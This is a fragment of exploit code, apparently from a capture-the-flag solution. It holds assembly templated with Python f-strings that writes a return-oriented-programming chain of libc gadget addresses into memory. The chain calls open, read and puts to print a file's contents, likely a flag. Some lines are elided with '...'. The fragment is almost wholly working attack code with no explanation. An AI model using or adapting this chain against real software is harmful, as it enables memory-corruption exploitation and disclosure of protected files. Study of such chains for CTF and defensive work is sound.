...
li t0, {libc.symbols['open']}
add t1, a0, t0
sd t1, {next_addr()}


li t0, {pop_rdi}          # read(3, libc_writable, 0x64)
add t1, a0, t0
sd t1, {next_addr()}
...
li t0, {libc.symbols['read']}
add t1, a0, t0
sd t1, {next_addr()}


li t0, {pop_rdi}          # puts(libc_writable)
add t1, a0, t0
sd t1, {next_addr()}

sd a2, {next_addr()}

li t0, {libc.symbols['puts']}
add t1, a0, t0
sd t1, {next_addr()}
